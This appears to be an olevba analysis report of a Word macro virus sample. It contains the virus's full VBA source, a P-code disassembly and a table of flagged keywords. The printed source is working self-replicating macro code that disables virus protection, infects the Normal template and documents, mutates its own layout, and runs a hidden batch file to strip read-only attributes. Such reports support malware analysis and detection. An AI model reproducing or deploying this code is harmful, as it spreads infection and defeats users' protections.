olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Intended.Ded.e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Intended.Ded.e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
'Swlabs 99!

On Error GoTo skam

Options.VirusProtection = False

SWLABS99

skam:
End Sub
 
'Copy From Normal to Active
Private Sub SWLABS99()
If Not ActiveDocument.VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then
    For i = 1 To NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
        d = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(i, 1)
        If Len(d) > 0 And Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then
            While Mid(d, Len(d) - 1, 2) = " _"
                i = i + 1
                d = Left(d, Len(d) - 1) & NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(i, 1)
            Wend
            d = e(d)
            ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines i * 2, d
        End If
    Next i
    ActiveDocument.SaveAs AddToRecentFiles:=False
Else
'Copy From Active to Normal
If Not NormalTemplate.VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then
    f (NormalTemplate.FullName)
    For i = 1 To ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
        d = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(i, 1)
        If Len(d) > 0 And Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then
            While Mid(d, Len(d) - 1, 2) = " _"
                i = i + 1
                d = Left(d, Len(d) - 1) & ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(i, 1)
            Wend
            d = e(d)
            NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines i * 2, d
        End If
    Next i
    NormalTemplate.Save
End If
End If
End Sub

'Make the Code Polymorphic
Private Function e(aString) As String
For i = 1 To Len(aString) - 1
    While Mid(aString, i, 2) = "  "
        aString = Left(aString, i) & Right(aString, Len(aString) - i - 1)
    Wend
    If Mid(aString, i, 1) = "." Then
        If Not Mid(aString, i - 1, 1) = Chr$(34) And Not Mid(aString, i + 1, 1) = Chr$(34) And Int(3 * Rnd) = 1 Then
            If Not Mid(aString, i + 1, 1) = Chr$(34) Then
                e = Left(aString, i - 1) & ". _" & Chr$(13) & Right(aString, Len(aString) - i)
                For j = 1 To Int(15 * Rnd)
                    e = " " & e
                Next j
                Exit Function
            End If
        End If
    Else
        If Mid(aString, i, 1) = " " And Int(3 * Rnd) = 1 And i > 1 Then
            If Not Mid(aString, i + 1, 1) = Chr$(34) And Not Mid(aString, i - 1, 1) = Chr$(34) Then
                e = Left(aString, i - 1) & " _" & Chr$(13) & Right(aString, Len(aString) - i)
                For j = 1 To Int(15 * Rnd)
                    e = " " & e
                Next j
                Exit Function
            End If
        End If
    End If
Next i
e = aString & Chr$(13) & "'" & (100 * Rnd)
Count = Int(15 * Rnd)
For j = 1 To Count
    e = " " & e
Next j
End Function

' Undo Read Only in the File
Private Sub f(fName)
If GetAttr(fName) And vbReadOnly Then
    Open Dir(fName) & ".bat" For Append As #1
        Print #1, "Attrib " & "-r " & Chr$(34) & fName & Chr$(34)
        Print #1, "del " & Chr$(34) & Dir(fName) & ".bat" & Chr$(34)
    Close #1
    shellResult = Shell(Dir(fName) & ".bat", vbHide)
End If
End Sub


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Intended.Ded.e
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 38589 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Close())
' Line #1:
' 	QuoteRem 0x0000 0x000A "Swlabs 99!"
' Line #2:
' Line #3:
' 	OnError PrivateSub 
' Line #4:
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #6:
' Line #7:
' 	ArgsCall id_034E 0x0000 
' Line #8:
' Line #9:
' 	Label PrivateSub 
' Line #10:
' 	EndSub 
' Line #11:
' Line #12:
' 	QuoteRem 0x0000 0x001A "Copy From Normal to Active"
' Line #13:
' 	FuncDefn (Private Sub id_034E())
' Line #14:
' 	LitStr 0x000E "Document_Close"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x03E8 
' 	LitDI2 0x03E8 
' 	LitVarSpecial (False)
' 	LitVarSpecial (False)
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0007 
' 	Not 
' 	IfBlock 
' Line #15:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #16:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St _B_var_d 
' Line #17:
' 	Ld _B_var_d 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Gt 
' 	Ld _B_var_d 
' 	LitStr 0x0001 " "
' 	Eq 
' 	Not 
' 	And 
' 	Ld _B_var_d 
' 	LitStr 0x0002 " _"
' 	Eq 
' 	Not 
' 	And 
' 	Ld _B_var_d 
' 	LitStr 0x0000 ""
' 	Eq 
' 	Not 
' 	And 
' 	Ld _B_var_d 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "'"
' 	Eq 
' 	Not 
' 	And 
' 	IfBlock 
' Line #18:
' 	Ld _B_var_d 
' 	Ld _B_var_d 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0002 " _"
' 	Eq 
' 	While 
' Line #19:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #20:
' 	Ld _B_var_d 
' 	Ld _B_var_d 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	St _B_var_d 
' Line #21:
' 	Wend 
' Line #22:
' 	Ld _B_var_d 
' 	ArgsLd c 0x0001 
' 	St _B_var_d 
' Line #23:
' 	Ld i 
' 	LitDI2 0x0002 
' 	Mul 
' 	Ld _B_var_d 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #24:
' 	EndIfBlock 
' Line #25:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #26:
' 	LitVarSpecial (False)
' 	ParamNamed Fa 
' 	Ld ActiveDocument 
' 	ArgsMemCall AddToRecentFiles 0x0001 
' Line #27:
' 	ElseBlock 
' Line #28:
' 	QuoteRem 0x0000 0x001A "Copy From Active to Normal"
' Line #29:
' 	LitStr 0x000E "Document_Close"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x03E8 
' 	LitDI2 0x03E8 
' 	LitVarSpecial (False)
' 	LitVarSpecial (False)
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0007 
' 	Not 
' 	IfBlock 
' Line #30:
' 	Ld NormalTemplate 
' 	MemLd vbReadOnly 
' 	Paren 
' 	ArgsCall False 0x0001 
' Line #31:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #32:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St _B_var_d 
' Line #33:
' 	Ld _B_var_d 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Gt 
' 	Ld _B_var_d 
' 	LitStr 0x0001 " "
' 	Eq 
' 	Not 
' 	And 
' 	Ld _B_var_d 
' 	LitStr 0x0002 " _"
' 	Eq 
' 	Not 
' 	And 
' 	Ld _B_var_d 
' 	LitStr 0x0000 ""
' 	Eq 
' 	Not 
' 	And 
' 	Ld _B_var_d 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "'"
' 	Eq 
' 	Not 
' 	And 
' 	IfBlock 
' Line #34:
' 	Ld _B_var_d 
' 	Ld _B_var_d 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0002 " _"
' 	Eq 
' 	While 
' Line #35:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #36:
' 	Ld _B_var_d 
' 	Ld _B_var_d 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	St _B_var_d 
' Line #37:
' 	Wend 
' Line #38:
' 	Ld _B_var_d 
' 	ArgsLd c 0x0001 
' 	St _B_var_d 
' Line #39:
' 	Ld i 
' 	LitDI2 0x0002 
' 	Mul 
' 	Ld _B_var_d 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #40:
' 	EndIfBlock 
' Line #41:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #42:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #43:
' 	EndIfBlock 
' Line #44:
' 	EndIfBlock 
' Line #45:
' 	EndSub 
' Line #46:
' Line #47:
' 	QuoteRem 0x0000 0x0019 "Make the Code Polymorphic"
' Line #48:
' 	FuncDefn (Private Function c(aString, id_FFFE As String) As String)
' Line #49:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld aString 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	For 
' Line #50:
' 	Ld aString 
' 	Ld i 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0002 "  "
' 	Eq 
' 	While 
' Line #51:
' 	Ld aString 
' 	Ld i 
' 	ArgsLd LBound 0x0002 
' 	Ld aString 
' 	Ld aString 
' 	FnLen 
' 	Ld i 
' 	Sub 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Right 0x0002 
' 	Concat 
' 	St aString 
' Line #52:
' 	Wend 
' Line #53:
' 	Ld aString 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "."
' 	Eq 
' 	IfBlock 
' Line #54:
' 	Ld aString 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Eq 
' 	Not 
' 	Ld aString 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Eq 
' 	Not 
' 	And 
' 	LitDI2 0x0003 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #55:
' 	Ld aString 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Eq 
' 	Not 
' 	IfBlock 
' Line #56:
' 	Ld aString 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 ". _"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	Ld aString 
' 	Ld aString 
' 	FnLen 
' 	Ld i 
' 	Sub 
' 	ArgsLd Right 0x0002 
' 	Concat 
' 	St c 
' Line #57:
' 	StartForVariable 
' 	Ld _B_var_j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000F 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	For 
' Line #58:
' 	LitStr 0x0001 " "
' 	Ld c 
' 	Concat 
' 	St c 
' Line #59:
' 	StartForVariable 
' 	Ld _B_var_j 
' 	EndForVariable 
' 	NextVar 
' Line #60:
' 	ExitFunc 
' Line #61:
' 	EndIfBlock 
' Line #62:
' 	EndIfBlock 
' Line #63:
' 	ElseBlock 
' Line #64:
' 	Ld aString 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 " "
' 	Eq 
' 	LitDI2 0x0003 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Gt 
' 	And 
' 	IfBlock 
' Line #65:
' 	Ld aString 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Eq 
' 	Not 
' 	Ld aString 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Eq 
' 	Not 
' 	And 
' 	IfBlock 
' Line #66:
' 	Ld aString 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0002 " _"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	Ld aString 
' 	Ld aString 
' 	FnLen 
' 	Ld i 
' 	Sub 
' 	ArgsLd Right 0x0002 
' 	Concat 
' 	St c 
' Line #67:
' 	StartForVariable 
' 	Ld _B_var_j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000F 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	For 
' Line #68:
' 	LitStr 0x0001 " "
' 	Ld c 
' 	Concat 
' 	St c 
' Line #69:
' 	StartForVariable 
' 	Ld _B_var_j 
' 	EndForVariable 
' 	NextVar 
' Line #70:
' 	ExitFunc 
' Line #71:
' 	EndIfBlock 
' Line #72:
' 	EndIfBlock 
' Line #73:
' 	EndIfBlock 
' Line #74:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #75:
' 	Ld aString 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x0001 "'"
' 	Concat 
' 	LitDI2 0x0064 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	Concat 
' 	St c 
' Line #76:
' 	LitDI2 0x000F 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	St _B_var_Count 
' Line #77:
' 	StartForVariable 
' 	Ld _B_var_j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld _B_var_Count 
' 	For 
' Line #78:
' 	LitStr 0x0001 " "
' 	Ld c 
' 	Concat 
' 	St c 
' Line #79:
' 	StartForVariable 
' 	Ld _B_var_j 
' 	EndForVariable 
' 	NextVar 
' Line #80:
' 	EndFunc 
' Line #81:
' Line #82:
' 	QuoteRem 0x0000 0x001B " Undo Read Only in the File"
' Line #83:
' 	FuncDefn (Private Sub False(_B_var_shellResult))
' Line #84:
' 	Ld _B_var_shellResult 
' 	ArgsLd FullName 0x0001 
' 	Ld shellResult 
' 	And 
' 	IfBlock 
' Line #85:
' 	Ld _B_var_shellResult 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0004 ".bat"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #86:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "Attrib "
' 	LitStr 0x0003 "-r "
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	Ld _B_var_shellResult 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #87:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "del "
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	Ld _B_var_shellResult 
' 	ArgsLd Dir 0x0001 
' 	Concat 
' 	LitStr 0x0004 ".bat"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #88:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #89:
' 	Ld _B_var_shellResult 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0004 ".bat"
' 	Concat 
' 	Ld su 
' 	ArgsLd vbHide 0x0002 
' 	St Shell 
' Line #90:
' 	EndIfBlock 
' Line #91:
' 	EndSub 
' Line #92:
' Line #93:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

